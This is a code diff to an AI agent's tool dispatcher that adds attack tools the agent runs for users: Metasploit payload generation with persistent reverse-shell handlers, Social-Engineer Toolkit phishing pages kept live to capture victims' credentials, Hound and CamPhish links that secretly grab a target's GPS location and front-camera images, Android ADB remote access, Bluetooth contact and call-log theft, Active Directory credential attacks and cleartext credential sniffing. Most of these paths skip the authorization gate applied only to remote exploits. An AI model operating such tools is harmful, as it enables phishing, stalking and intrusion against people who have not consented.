@@ -9,7 +9,11 @@ import { reconUrl, renderRecon } from '../web/recon.js';
 import { extractFindings, detectScanner } from '../scan/parsers.js';
 import { extractWebFindings, detectWebScanner } from '../scan/webparsers.js';
 import { extractWirelessFindings, buildWirelessCommand, isNoAdapter } from '../scan/wireless.js';
-import { extractBluetoothFindings, buildBluetoothCommand } from '../scan/bluetooth.js';
+import { extractBluetoothFindings, buildBluetoothCommand, isNoBtAdapter } from '../scan/bluetooth.js';
+import { buildGhostCommand, extractGhostFindings, isNoDevice, ghostLabel } from '../ghost/index.js';
+import { buildAdCommand, extractAdFindings, isNoAd, adLabel } from '../ad/index.js';
+import { cyclic, cyclicFind, renderTemplate, buildExploitDevCommand, xdevLabel } from '../exploitdev/index.js';
+import { parsePasswords, checkMany, renderPwnedReport, pwnedLabel } from '../pwnedpass/index.js';
 import { extractMitmFindings, buildMitmCommand } from '../scan/mitm.js';
 import { gateAction } from '../authz/authz.js';
 import { extractOsintFindings, buildOsintCommand, buildOsintSweep, renderOsint, sniffKind } from '../osint/osint.js';
@@ -35,6 +39,14 @@ import { parseNetexec } from '../netexec/index.js';
 import { parseZap } from '../zap/index.js';
 import { parseContentDisc } from '../scan/contentdisc.js';
 import { parseDnsenum } from '../scan/dnsenum.js';
+import { parseJohn } from '../scan/john.js';
+import { buildSniffCommand, parseTshark } from '../scan/tshark.js';
+import { renderMenu, pickAttack, parseMsfArgs, buildAttack, msfconsoleCmd, detectIpCommand, parseMsf, ENSURE_MSF } from '../metasploit/index.js';
+import { startJob, readJob, writeJob, stopJob, listJobs, updateJobMeta } from '../exec/jobs.js';
+import { detectLiveCommand, liveLabel } from '../exec/livetools.js';
+import { renderSetMenu, pickSetVector, buildSetCommand, parseSet } from '../set/index.js';
+import { buildHoundCommand, extractHoundLink, parseHound } from '../hound/index.js';
+import { buildCamphishCommand, extractCamphishLink, parseCamphish, pickTemplate, CAMPHISH_TEMPLATES } from '../camphish/index.js';
 import { runDorkSweep, renderDork } from '../dork/index.js';
 import { renderHashid } from '../hashid/index.js';
 import { runShodan, renderShodan, shodanFindings } from '../shodan/index.js';
@@ -110,7 +122,7 @@ function trimHistory(msgs) {
 const VULN_ENGAGE_RE =
   /\b(vuln\w*|exploit\w*|cve[-\s]?\d+|cwe[-\s]?\d+|owasp|metasploit|payload|reverse[-\s]?shell|rce|lfi|rfi|sql[\s-]?inj\w*|sqli|xss|csrf|ssrf|idor|deserial\w*|priv(?:ilege)?[-\s]?esc\w*|shellshock|log4shell|eternalblue|bluekeep|proxylogon|zerologon|spring4shell|heartbleed|dirty[-\s]?(?:cow|pipe)|drupalgeddon|meltdown|spectre|follina|printnightmare|citrix[-\s]?bleed|baron[-\s]?samedit|regresshion)\b/i;
 
-const TOOL_TYPES = ['execute', 'search', 'fetch', 'recon', 'scan', 'vulnscan', 'wireless', 'bluetooth', 'mitm', 'osint', 'exploit', 'owasp', 'artifact', 'file', 'tool', 'browser', 'payload', 'report', 'dork', 'hashid', 'shodan',
+const TOOL_TYPES = ['execute', 'search', 'fetch', 'recon', 'scan', 'vulnscan', 'wireless', 'bluetooth', 'ghost', 'ad', 'exploitdev', 'pwnedpass', 'mitm', 'sniff', 'osint', 'exploit', 'msf', 'set', 'hound', 'camphish', 'owasp', 'artifact', 'file', 'tool', 'browser', 'payload', 'report', 'dork', 'hashid', 'shodan',
   // AppSec / DevSecOps code-security suite (each its own tag):
   ...ALL_AREAS,
   // Cloud & infrastructure security posture (Phase 1+):
@@ -169,6 +181,8 @@ async function runAndCapture(command, { sessionId, userId }) {
       ...extractWebFindings(command, out),
       ...extractWirelessFindings(command, out),
       ...extractBluetoothFindings(command, out),
+      ...extractGhostFindings(command, out),
+      ...extractAdFindings(command, out),
       ...extractMitmFindings(command, out),
       ...extractOsintFindings(command, out),
       ...extractExploitFindings(command, out),
@@ -190,6 +204,12 @@ async function runAndCapture(command, { sessionId, userId }) {
       ...parseZap(command, out),
       ...parseContentDisc(command, out),
       ...parseDnsenum(command, out),
+      ...parseJohn(command, out),
+      ...parseTshark(command, out),
+      ...parseMsf(command, out),
+      ...parseSet(command, out),
+      ...parseHound(command, out),
+      ...parseCamphish(command, out),
     ];
     if (items.length) findingsAdded = await addFindings(sessionId, userId, items.map(enrichCvss));
   } catch (e) {
@@ -209,6 +229,19 @@ async function runTool({ type, body }, { sessionId, userId }) {
   }
 
   if (type === 'execute') {
+    // STRONGLY-BOUND live sessions: if this is a listener / capture / tunnel / interactive console (any Kali
+    // tool that must stay alive for a callback), run it as a PERSISTENT job = a Live Hack Environment, not a
+    // one-shot (which would block/time out). Auto-opens the panel + AI management box. Gating already ran above.
+    const live = detectLiveCommand(body);
+    if (live.live) {
+      const label = liveLabel(body, live.kind);
+      const job = await startJob({ command: body, sessionId, userId, label, kind: live.kind, live: true, interactive: live.interactive });
+      return {
+        label: '$ ' + body,
+        output: `▶️ **Live session started** — ${live.why} (job \`${job.id}\`).\n\nA Live Hack Environment opened below. Just tell the management box in plain language what to show or do (e.g. ${live.interactive ? '"run whoami in the shell", "show me the session"' : '"any callbacks yet?", "show me the captured data"'}) and I'll operate it for you — or use raw stdin.`,
+        exitCode: 0, jobId: job.id, live: true, kind: live.kind, envLabel: label,
+      };
+    }
     const { result, findingsAdded } = await runAndCapture(body, { sessionId, userId });
     return {
       label: '$ ' + body,
@@ -342,23 +375,195 @@ async function runTool({ type, body }, { sessionId, userId }) {
     };
   }
 
-  if (type === 'bluetooth') {
-    // body: a raw hcitool/bluesnarfer/l2ping/sdptool command, OR
-    // "<action> [mac] [chan] [range]" where action = scan|lescan|info|services|ping|snarf|contacts|calls|flood.
+  // ```sniff <action> [pcap|iface] [filter] -> tshark packet capture & analysis. action = capture|creds|
+  // http|dns|hosts|protocols|read|info. Extracts cleartext creds from traffic. Offline pcap analysis works
+  // anywhere; live capture needs a network interface + NET_RAW (the sandbox has it; desktop = real machine).
+  if (type === 'sniff') {
     let command = body.trim();
-    const known = /hcitool|bluesnarfer|l2ping|sdptool|bluetoothctl|hciconfig/i.test(command);
+    const known = /tshark|dumpcap|tcpdump|capinfos|editcap|mergecap/i.test(command);
     if (!known) {
-      const [action, mac, chan, range] = command.split(/\s+/);
-      command = buildBluetoothCommand({ action, mac, chan: chan || undefined, range: range || undefined });
+      const parts = command.split(/\s+/);
+      const action = (parts[0] || 'info').toLowerCase();
+      // 2nd token: an iface for capture, else a pcap path; rest = display filter (for read)
+      const isCapture = action === 'capture';
+      const arg = parts[1];
+      const rest = parts.slice(2).join(' ');
+      command = buildSniffCommand({
+        action,
+        iface: isCapture ? arg : undefined,
+        pcap: !isCapture && arg && arg !== '-' ? arg : undefined,
+        count: isCapture ? parts[2] : undefined,
+        filter: action === 'read' ? rest : undefined,
+      });
     }
     const { result, findingsAdded } = await runAndCapture(command, { sessionId, userId });
+    const rawOut = fmtCmdOutput(result) || '(no output)';
+    const noCap = /SNIFF-NOCAPTURE/.test(`${result.stdout || ''}${result.stderr || ''}${rawOut}`);
+    const output = noCap
+      ? '⚠️ NO CAPTURE INTERFACE on the exec backend — REAL output, not a capture.\n' + rawOut +
+        '\n\n[Live packet capture needs a network interface + NET_RAW (or run the exec backend on the local/desktop machine). Offline analysis of an existing .pcap (```sniff read/http/creds <file>) works anywhere.]'
+      : rawOut;
     return {
-      label: 'bluetooth: ' + body.split('\n')[0].slice(0, 80),
-      output: fmtCmdOutput(result) || '(no output)',
+      label: 'sniff: ' + command.split('\n')[0].slice(0, 60),
+      output,
       exitCode: result.exitCode,
       blocked: result.blocked,
       findingsAdded,
     };
+  }
+
+  if (type === 'bluetooth') {
+    // body: a raw hcitool/bluesnarfer/l2ping/sdptool command, OR "<action> [mac] [chan] [arg...]" where action =
+    // check|scan|lescan|info|services|ping|info-snarf|contacts|calls|search|delete|list-storage|custom|flood.
+    // The adapter is AUTO-DETECTED (hci0/hci1/USB dongle); no radio -> honest BT-NOADAPTER (never fabricated).
+    let command = body.trim();
+    const known = /hcitool|bluesnarfer|l2ping|sdptool|bluetoothctl|hciconfig/i.test(command);
+    if (!known) {
+      const parts = command.split(/\s+/);
+      const [action, mac, chan] = parts;
+      const rest = parts.slice(3).join(' ');
+      // arg after chan means different things per action
+      const opts = { action, mac, chan: chan || undefined };
+      if (action === 'search') opts.name = rest || undefined;
+      else if (action === 'custom') opts.atcmd = rest || undefined;
+      else if (action === 'calls' || action === 'contacts' || action === 'snarf') {
+        // "<range> [TYPE]" e.g. "1-50 DC"
+        const [range, t] = rest.split(/\s+/);
+        if (range) opts.range = range;
+        if (t) opts.type = t;
+      } else if (rest) opts.range = rest;
+      command = buildBluetoothCommand(opts);
+    }
+    const { result, findingsAdded } = await runAndCapture(command, { sessionId, userId });
+    const rawOut = fmtCmdOutput(result) || '(no output)';
+    const noAdapter = isNoBtAdapter(`${result.stdout || ''}\n${result.stderr || ''}\n${rawOut}`);
+    const output = noAdapter
+      ? '⚠️ NO BLUETOOTH ADAPTER on the exec backend — this is REAL output, not a scan.\n' + rawOut +
+        '\n\n[Do NOT invent Bluetooth devices, MACs, contacts or call logs. Real BT recon/snarf needs a Bluetooth radio physically attached to the machine running the exec backend, near the target. Run the exec backend on that local/desktop machine (or EXEC_BACKEND=ssh to a Kali box with an adapter), then retry.]'
+      : rawOut;
+    return {
+      label: 'bluetooth: ' + body.split('\n')[0].slice(0, 80),
+      output,
+      exitCode: result.exitCode,
+      blocked: result.blocked,
+      findingsAdded,
+      noAdapter,
+    };
+  }
+
+  if (type === 'ghost') {
+    // Ghost — Android remote access over ADB (modeled on Ghost Framework). body: a raw adb command, OR
+    // "<action> [target] [arg] [arg2]" where action = check|scan|connect|disconnect|devices|shell|sysinfo|
+    // screenshot|screenrecord|pull|apps|install|uninstall|run|logcat|battery|network|wifi|macinet|wpa|
+    // extract-apk|current|input|forward|reboot|shutdown|unlock. Target = device IP[:5555] (or CIDR for scan).
+    let command = body.trim();
+    const known = /^\s*(adb|nmap)\b/i.test(command);
+    if (!known) {
+      const parts = command.split(/\s+/);
+      const [action, target, arg, ...restArr] = parts;
+      const rest = restArr.join(' ');
+      // `shell` takes a free-form command as its arg; others take discrete tokens.
+      const opts = action === 'shell'
+        ? { action, target, arg: [arg, rest].filter(Boolean).join(' ') }
+        : { action, target, arg, arg2: rest || undefined };
+      command = buildGhostCommand(opts);
+    }
+    const { result, findingsAdded } = await runAndCapture(command, { sessionId, userId });
+    const rawOut = fmtCmdOutput(result) || '(no output)';
+    const noDevice = isNoDevice(`${result.stdout || ''}\n${result.stderr || ''}\n${rawOut}`);
+    const output = noDevice
+      ? '⚠️ NO REACHABLE ANDROID DEVICE over ADB — this is REAL output, not a scan.\n' + rawOut +
+        '\n\n[Do NOT invent device data (model, files, screenshots, apps). Ghost needs the target to have ADB-over-network enabled with tcp:5555 reachable from the exec backend (or a USB device on the backend machine). Run the exec backend on the desktop app / same LAN as the target, then retry.]'
+      : rawOut;
+    return {
+      label: ghostLabel(body),
+      output,
+      exitCode: result.exitCode,
+      blocked: result.blocked,
+      findingsAdded,
+      noDevice,
+    };
+  }
+
+  if (type === 'ad') {
+    // Active Directory attack-path (BloodHound/impacket). body: a raw command, OR
+    // "<action> [domain] [k=v ...]" where action = check|collect|analyze|kerberoast|asreproast|dcsync and
+    // k=v ∈ u=<user> p=<pass> dc=<dc-ip> ns=<dc-ip> file=<path>.
+    let command = body.trim();
+    const known = /^\s*(bloodhound-python|impacket-|GetUserSPNs|GetNPUsers|secretsdump|python3?\s)/i.test(command);
+    if (!known) {
+      const tokens = command.split(/\s+/);
+      const action = tokens.shift();
+      const opts = { action };
+      for (const tok of tokens) {
+        const kv = /^([a-z]+)=(.+)$/i.exec(tok);
+        if (kv) {
+          const k = kv[1].toLowerCase();
+          if (k === 'u' || k === 'user') opts.user = kv[2];
+          else if (k === 'p' || k === 'pass') opts.pass = kv[2];
+          else if (k === 'dc' || k === 'ns' || k === 'dcip') { opts.dc = opts.dc || kv[2]; opts.dcip = kv[2]; }
+          else if (k === 'file') opts.file = kv[2];
+          else if (k === 'domain' || k === 'd') opts.domain = kv[2];
+        } else if (!opts.domain) opts.domain = tok; // first positional = domain
+      }
+      command = buildAdCommand(opts);
+    }
+    const { result, findingsAdded } = await runAndCapture(command, { sessionId, userId });
+    const rawOut = fmtCmdOutput(result) || '(no output)';
+    const noAd = isNoAd(`${result.stdout || ''}\n${result.stderr || ''}\n${rawOut}`);
+    const output = noAd
+      ? '⚠️ NO AD DATA / DC UNREACHABLE — this is REAL output, not analysis.\n' + rawOut +
+        '\n\n[Do NOT invent users, groups, hashes or attack paths. AD enumeration needs valid domain creds + network line-of-sight to a DC (LDAP/389, SMB/445, Kerberos/88). Run the exec backend on a host that can reach the DC, then retry.]'
+      : rawOut;
+    return {
+      label: adLabel(body),
+      output,
+      exitCode: result.exitCode,
+      blocked: result.blocked,
+      findingsAdded,
+      noAd,
+    };
+  }
+
+  if (type === 'exploitdev') {
+    // Custom exploit dev. body: "<action> [args]" where action = pattern|offset|template|checksec|compile|
+    // gadgets|shellcode. pattern/offset/template are pure computation (instant, no shell, no target).
+    const raw = body.trim();
+    const tokens = raw.split(/\s+/);
+    const action = (tokens[0] || '').toLowerCase();
+
+    if (action === 'pattern') {
+      const len = parseInt(tokens[1], 10) || 200;
+      const patt = cyclic(len);
+      return { label: xdevLabel(body), output: `cyclic pattern (length ${patt.length}, pwntools-compatible):\n${patt}`, exitCode: 0, findingsAdded: 0 };
+    }
+    if (action === 'offset') {
+      const off = cyclicFind(tokens[1] || '');
+      const out = off < 0
+        ? `offset: value "${tokens[1]}" not found in the cyclic pattern (is it the exact EIP/RIP crash value?).`
+        : `offset: ${off}   (the ${off}-byte prefix before you control EIP/RIP — set OFFSET=${off})`;
+      return { label: xdevLabel(body), output: out, exitCode: 0, findingsAdded: 0 };
+    }
+    if (action === 'template') {
+      const lang = tokens[1] || 'python';
+      const vuln = tokens[2] || 'bof';
+      return { label: xdevLabel(body), output: renderTemplate(lang, vuln, {}), exitCode: 0, findingsAdded: 0 };
+    }
+
+    // Shell helpers (checksec/compile/gadgets/shellcode).
+    let command = raw;
+    if (!/^\s*(gcc|go\s+build|checksec|ROPgadget|msfvenom|file\s|python3?\s)/i.test(raw)) {
+      command = buildExploitDevCommand({
+        action,
+        file: tokens[1],
+        out: action === 'compile' ? tokens[2] : undefined,
+        arch: action === 'shellcode' ? tokens[1] : undefined,
+        lhost: action === 'shellcode' ? tokens[2] : undefined,
+        lport: action === 'shellcode' ? tokens[3] : undefined,
+      });
+    }
+    const { result, findingsAdded } = await runAndCapture(command, { sessionId, userId });
+    return { label: xdevLabel(body), output: fmtCmdOutput(result) || '(no output)', exitCode: result.exitCode, blocked: result.blocked, findingsAdded };
   }
 
   if (type === 'mitm') {
@@ -493,6 +698,183 @@ async function runTool({ type, body }, { sessionId, userId }) {
       blocked: result.blocked,
       findingsAdded,
     };
+  }
+
+  // ```msf — Metasploit made simple: the user picks an attack by number (or describes it) and the AI performs
+  // it. Generates the msfvenom payload with the OPERATOR'S OWN IP (to test on their own device), and starts
+  // the multi/handler as a PERSISTENT background job so the session stays alive. Sub-commands: menu | ip |
+  // sessions | read <job> | send <job> <cmd> | stop <job> | <number|desc> [lhost=..] [lport=..] [rhost=..].
+  if (type === 'msf') {
+    const raw = body.trim();
+    const parts = raw.split(/\s+/);
+    const first = (parts[0] || '').toLowerCase();
+
+    if (!raw || first === 'menu' || first === 'help' || first === 'list-attacks')
+      return { label: 'msf: menu', output: renderMenu(), exitCode: 0 };
+
+    if (['ip', 'detect-ip', 'myip', 'lhost'].includes(first)) {
+      const { result } = await runAndCapture(detectIpCommand(), { sessionId, userId });
+      return { label: 'msf: detect-ip', output: 'Your reachable IPs — pick one as LHOST (LAN IP to test on a device on the same network):\n\n' + (fmtCmdOutput(result) || ''), exitCode: 0 };
+    }
+
+    if (['sessions', 'jobs', 'listeners'].includes(first)) {
+      const jl = listJobs({ sessionId });
+      const out = jl.length ? jl.map((j) => `• [${j.status}] \`${j.id}\` — ${j.label} (${j.backend})`).join('\n') : '(no listeners / background jobs running)';
+      return { label: 'msf: sessions', output: '**Live background jobs / listeners:**\n' + out + '\n\nUse ```msf read <id> to view live output, ```msf send <id> <cmd> to type into it, ```msf stop <id> to kill it.', exitCode: 0 };
+    }
+    if (first === 'read' && parts[1]) {
+      const r = readJob(parts[1], 0);
+      if (r.error) return { label: 'msf: read', output: r.error, exitCode: 1 };
+      return { label: 'msf: read ' + parts[1], output: `**[${r.status}] ${r.label}** (${r.backend})\n\`\`\`\n${(r.text || '(no output yet)').slice(-4000)}\n\`\`\``, exitCode: 0 };
+    }
+    if (first === 'send' && parts[1]) {
+      const r = writeJob(parts[1], parts.slice(2).join(' '));
+      return { label: 'msf: send', output: r.ok ? `sent to job ${parts[1]}` : (r.error || 'error'), exitCode: r.ok ? 0 : 1 };
+    }
+    if (first === 'stop' && parts[1]) {
+      const r = stopJob(parts[1]);
+      return { label: 'msf: stop', output: r.ok ? `🛑 stopped job ${parts[1]}` : (r.error || 'error'), exitCode: r.ok ? 0 : 1 };
+    }
+
+    // Raw passthrough: msfconsole -> persistent job; msfvenom -> generate the payload.
+    if (/^msfconsole\b/i.test(raw)) {
+      const job = await startJob({ command: ENSURE_MSF + raw, sessionId, userId, label: 'msfconsole', kind: 'msf' });
+      return { label: 'msf: msfconsole', output: `▶️ Started msfconsole as a live session \`${job.id}\` (stays alive). A live session opened below — type Metasploit commands there or just tell it what to do.`, exitCode: 0, jobId: job.id, live: true, kind: 'msf', envLabel: 'msfconsole' };
+    }
+    if (/^msfvenom\b/i.test(raw)) {
+      const { result, findingsAdded } = await runAndCapture(raw, { sessionId, userId });
+      return { label: 'msf: msfvenom', output: fmtCmdOutput(result) || '(no output)', exitCode: result.exitCode, findingsAdded };
+    }
+
+    // Attack selection: a number or a description, + lhost/lport/rhost.
+    const item = pickAttack(first === 'payload' || first === 'exploit' || first === 'attack' ? parts.slice(1).join(' ') : raw);
+    if (!item) return { label: 'msf', output: `Couldn't match that to an attack. Here's the menu:\n\n${renderMenu()}`, exitCode: 1 };
+    const args = parseMsfArgs(parts);
+    const plan = buildAttack(item, args);
+
+    // Exploit path targets a remote RHOST -> gate it (authorization required).
+    if (plan.kind === 'exploit') {
+      if (!args.rhost) return { label: 'msf: ' + item.name, output: `**${item.name}**\n${plan.note}\n\nUsage: \`\`\`msf ${item.id} rhost=<target> lhost=<your-ip> lport=4444`, exitCode: 1 };
+      const g = await gateAction({ type: 'exploit', body: args.rhost, sessionId, userId });
+      if (g.blocked) return { label: `⛔ authorization required: ${args.rhost}`, output: g.message, exitCode: 126, blocked: true };
+      const job = await startJob({ command: msfconsoleCmd(plan.resource), sessionId, userId, label: `exploit ${item.name} -> ${args.rhost}`, kind: 'msf' });
+      return { label: 'msf: ' + item.name, output: `▶️ Launched **${item.name}** against \`${args.rhost}\` as a live session \`${job.id}\` (handler stays alive).\n\n${plan.note}\n\nA live session opened below — tell it "list sessions / interact with session 1".`, exitCode: 0, jobId: job.id, live: true, kind: 'msf', envLabel: `exploit ${item.name}` };
+    }
+
+    // Handler-only path: start the persistent listener.
+    if (plan.kind === 'handler') {
+      const job = await startJob({ command: msfconsoleCmd(plan.handler), sessionId, userId, label: `handler :${plan.lport}`, kind: 'msf' });
+      return { label: 'msf: handler', output: `🎧 Started a persistent handler on \`0.0.0.0:${plan.lport}\` as a live session \`${job.id}\`.\n${plan.note}\n\nA live session opened below — it'll show incoming sessions; tell it "interact with session 1" when one lands.`, exitCode: 0, jobId: job.id, live: true, kind: 'msf', envLabel: `handler :${plan.lport}` };
+    }
+
+    // Payload path: (1) generate the payload with the user's IP, (2) start the matching handler as a job.
+    const { result: venomRes } = await runAndCapture(ENSURE_MSF + plan.venom, { sessionId, userId });
+    const job = await startJob({ command: msfconsoleCmd(plan.handler), sessionId, userId, label: `handler :${plan.lport} (${item.name})`, kind: 'msf' });
+    const lines = [
+      `**${item.name}** — payload built with LHOST \`${plan.lhost}\` LPORT \`${plan.lport}\``,
+      '```', plan.venom, '```',
+      fmtCmdOutput(venomRes)?.trim() ? `→ ${fmtCmdOutput(venomRes).trim().split('\n').slice(-3).join('\n')}` : '',
+      `\n🎧 Handler running as a live session \`${job.id}\` (stays alive). A live session opened below — when the payload runs on the target, tell it "interact with session 1".`,
+      `\n${plan.note}`,
+    ].filter(Boolean);
+    return { label: 'msf: ' + item.name, output: lines.join('\n'), exitCode: 0, jobId: job.id, live: true, kind: 'msf', envLabel: `${item.name} handler` };
+  }
+
+  // ```set — the Social-Engineer Toolkit, made simple. The user picks a social-engineering attack (number or
+  // description) and the AI performs it: QR codes, payloads, credential-harvester phishing sites, powershell
+  // shells, etc. SET is driven non-interactively (menu answers piped in). Cloned-site/harvester listeners run
+  // as PERSISTENT background jobs so the phishing page stays alive to capture victims. Sub: menu | ip | <sel>.
+  if (type === 'set') {
+    const raw = body.trim();
+    const parts = raw.split(/\s+/);
+    const first = (parts[0] || '').toLowerCase();
+    if (!raw || first === 'menu' || first === 'help') return { label: 'set: menu', output: renderSetMenu(), exitCode: 0 };
+    if (['ip', 'detect-ip', 'myip'].includes(first)) {
+      const { result } = await runAndCapture(detectIpCommand(), { sessionId, userId });
+      return { label: 'set: detect-ip', output: 'Your reachable IPs — pick one as LHOST / the harvester post-back:\n\n' + (fmtCmdOutput(result) || ''), exitCode: 0 };
+    }
+    const item = pickSetVector(first === 'attack' || first === 'vector' ? parts.slice(1).join(' ') : raw);
+    if (!item) return { label: 'set', output: `Couldn't match that to a SET attack. Menu:\n\n${renderSetMenu()}`, exitCode: 1 };
+    // parse opts (key=value + positional): url (contains :// or a dot), lhost (ip), lport (number), ptype
+    const opts = {};
+    for (const t of parts.slice(1)) {
+      const kv = /^(url|lhost|lport|ptype|payloadtype|template)=(.+)$/i.exec(t);
+      if (kv) { const k = kv[1].toLowerCase().replace('payloadtype', 'ptype'); opts[k === 'ptype' ? 'payloadType' : k] = kv[2]; continue; }
+      if (/:\/\//.test(t)) opts.url = t;
+      else if (/^(\d{1,3}\.){3}\d{1,3}$/.test(t)) opts.lhost = t;
+      else if (/^\d{2,5}$/.test(t)) opts.lport = t;
+    }
+    // required-field check
+    const missing = (item.needs || []).filter((n) => !opts[n]);
+    if (missing.length) return { label: 'set: ' + item.name, output: `**${item.name}** needs: ${missing.join(', ')}.\nUsage: \`\`\`set ${item.id} ${(item.needs || []).map((n) => n + '=<' + n + '>').join(' ')}\n(I can detect your IP with \`\`\`set ip.)`, exitCode: 1 };
+
+    const built = buildSetCommand(item.vector, opts);
+    if (built.infoOnly || !built.command) return { label: 'set: ' + item.name, output: `**${item.name}**\n${built.note}`, exitCode: 0 };
+
+    if (built.listener) {
+      // credential harvester / web-jacking / tabnabbing: keep SET's phishing web server ALIVE as a job.
+      const job = await startJob({ command: built.command, sessionId, userId, label: `SET ${item.vector} (${opts.url || ''})`, kind: 'set', meta: { link: opts.url || null } });
+      return { label: 'set: ' + item.name, output: `🎣 **${item.name}** — LIVE as a live session \`${job.id}\`.\n${built.note}\n\nA live session opened below — tell it "show me captured credentials / any victims yet" and I'll operate it.`, exitCode: 0, jobId: job.id, live: true, kind: 'set', link: opts.url || null, envLabel: `SET ${item.vector}` };
+    }
+    // one-shot generator (QR / payload / powershell / infectious): run + collect the artifact.
+    const { result, findingsAdded } = await runAndCapture(built.command, { sessionId, userId });
+    const out = fmtCmdOutput(result) || '';
+    const arts = [...out.matchAll(/SET-ARTIFACT:\s*\d+ bytes\s+(\S+)/gi)].map((m) => m[1]);
+    return {
+      label: 'set: ' + item.name,
+      output: `**${item.name}**\n${built.note}\n\n${arts.length ? '✅ Generated: ' + arts.join(', ') : out.split('\n').slice(-6).join('\n')}`,
+      exitCode: result.exitCode, findingsAdded,
+    };
+  }
+
+  // ```hound — geolocation + device-recon tracker. Starts Hound (php + cloudflared tunnel) as a PERSISTENT
+  // background job, waits for the public link, and hands it back to deliver to the target. When the target
+  // opens it and allows location, exact GPS + device intel stream into the job (captured -> findings).
+  if (type === 'hound') {
+    const raw = body.trim().toLowerCase();
+    // `hound read <job>` / `hound link <job>` -> show a running tracker's output/link
+    const rd = /^(read|link|data)\s+(\S+)/.exec(raw);
+    if (rd) {
+      const r = readJob(rd[2], 0);
+      if (r.error) return { label: 'hound', output: r.error, exitCode: 1 };
+      const link = extractHoundLink(r.text);
+      return { label: 'hound: ' + rd[2], output: (link ? `Link: ${link}\n\n` : '') + '```\n' + (r.text || '(no output yet)').slice(-3000) + '\n```', exitCode: 0 };
+    }
+    const job = await startJob({ command: buildHoundCommand(), sessionId, userId, label: 'hound GPS tracker', kind: 'hound' });
+    // cloudflared usually publishes the link in ~15-30s — poll for it (this action legitimately takes that long).
+    let link = null;
+    for (let i = 0; i < 13 && !link; i++) { await new Promise((r) => setTimeout(r, 3000)); link = extractHoundLink(readJob(job.id, 0).text); }
+    if (link) updateJobMeta(job.id, { link });
+    // A LIVE HACK ENVIRONMENT: auto-open the Sessions panel + AI management box (live/kind/link surfaced via emit).
+    const envFields = { jobId: job.id, live: true, kind: 'hound', link, envLabel: 'Hound GPS tracker' };
+    if (link) {
+      return { label: 'hound', output: `🐕 **Hound tracking link is LIVE** (job \`${job.id}\`):\n\n**${link}**\n\nSend this to the target. The moment they open it and allow location in their browser, I capture their EXACT GPS coordinates + device intel (OS, model, public IP, ISP, browser). A live session opened below — just tell it "show me the location / any new hits" and I'll operate it for you. (Authorized tracking / OSINT engagements only.)`, exitCode: 0, ...envFields };
+    }
+    return { label: 'hound', output: `🐕 Hound is starting as job \`${job.id}\` — the cloudflared tunnel is still coming up. A live session opened below; in a few seconds ask it for the public trycloudflare.com link to deliver to the target.`, exitCode: 0, ...envFields };
+  }
+
+  // ```camphish — webcam-grab + geolocation via a phishing page (Festival/YouTube/Meeting template). Starts
+  // CamPhish (php + cloudflared) as a PERSISTENT job, returns the public link; when the target opens it and
+  // allows CAMERA, front-camera shots (cam*.png) + GPS + device intel stream in (captures -> findings).
+  if (type === 'camphish') {
+    const raw = body.trim();
+    const rd = /^(read|link|data)\s+(\S+)/i.exec(raw);
+    if (rd) {
+      const r = readJob(rd[2], 0);
+      if (r.error) return { label: 'camphish', output: r.error, exitCode: 1 };
+      const link = extractCamphishLink(r.text);
+      return { label: 'camphish: ' + rd[2], output: (link ? `Link: ${link}\n\n` : '') + '```\n' + (r.text || '(no output yet)').slice(-3000) + '\n```', exitCode: 0 };
+    }
+    const tmpl = pickTemplate(raw.replace(/^(start|template)\s+/i, ''));
+    const job = await startJob({ command: buildCamphishCommand(tmpl), sessionId, userId, label: `camphish (${CAMPHISH_TEMPLATES[tmpl]})`, kind: 'camphish' });
+    let link = null;
+    for (let i = 0; i < 14 && !link; i++) { await new Promise((r) => setTimeout(r, 3000)); link = extractCamphishLink(readJob(job.id, 0).text); }
+    if (link) updateJobMeta(job.id, { link });
+    const envFields = { jobId: job.id, live: true, kind: 'camphish', link, envLabel: `CamPhish (${CAMPHISH_TEMPLATES[tmpl]})` };
+    if (link) {
+      return { label: 'camphish', output: `📸 **CamPhish is LIVE** (job \`${job.id}\`, template: ${CAMPHISH_TEMPLATES[tmpl]}):\n\n**${link}**\n\nDeliver this link to the target. When they open it and allow CAMERA, I capture their front-camera shots + GPS + device intel. A live session opened below — tell it "show me the captured images / any GPS" and I'll operate it. (Authorized social-engineering only.)`, exitCode: 0, ...envFields };
+    }
+    return { label: 'camphish', output: `📸 CamPhish is starting as job \`${job.id}\` (${CAMPHISH_TEMPLATES[tmpl]}) — the cloudflared tunnel is coming up. A live session opened below; ask it for the public link in a few seconds.`, exitCode: 0, ...envFields };
   }
 
   if (type === 'owasp') {
@@ -816,6 +1198,17 @@ async function runTool({ type, body }, { sessionId, userId }) {
     return { label: 'dork: ' + String(body || '').trim().slice(0, 60), output: renderDork(sweep), exitCode: 0, findingsAdded };
   }
 
+  // ```pwnedpass <password | one-per-line list> -> check password(s) against HaveIBeenPwned's breach corpus
+  // via k-anonymity (only a 5-char SHA-1 prefix is sent; the full password never leaves). Defensive, not gated.
+  if (type === 'pwnedpass') {
+    const passwords = parsePasswords(body);
+    if (!passwords.length) {
+      return { label: 'pwnedpass', output: 'Usage: ```pwnedpass <password>``` — or paste/upload a .txt with one password per line. Only a 5-char SHA-1 prefix is sent (k-anonymity); your full password never leaves this machine.', exitCode: 1 };
+    }
+    const results = await checkMany(passwords, { signal });
+    return { label: pwnedLabel(passwords), output: renderPwnedReport(results), exitCode: 0, findingsAdded: 0 };
+  }
+
   // ```hashid <hash> -> identify the hash algorithm(s) and produce the hashcat -m mode, john format, and a
   // ready crack command. Accepts one hash, several (one per line), or a shadow/pwdump line. Local analysis.
   if (type === 'hashid') {
@@ -1034,6 +1427,8 @@ export async function runAgent({ history, sessionId, userId, emit, signal, memor
       if (r.findingsAdded > 0) emit('findings', { count: r.findingsAdded });
       // Live browser view for the UI panel.
       if (r.screenshot) emit('browser', { url: r.pageUrl, screenshot: r.screenshot });
+      // Live Hack Environment — a callback/capture session started: auto-open the Sessions panel + focus this job.
+      if (r.jobId && r.live) emit('environment', { jobId: r.jobId, kind: r.kind, link: r.link || null, label: r.envLabel || r.kind });
 
       if (r.artifact) {
         // A generated file — render a clickable download link (NOT a fenced block), and tell
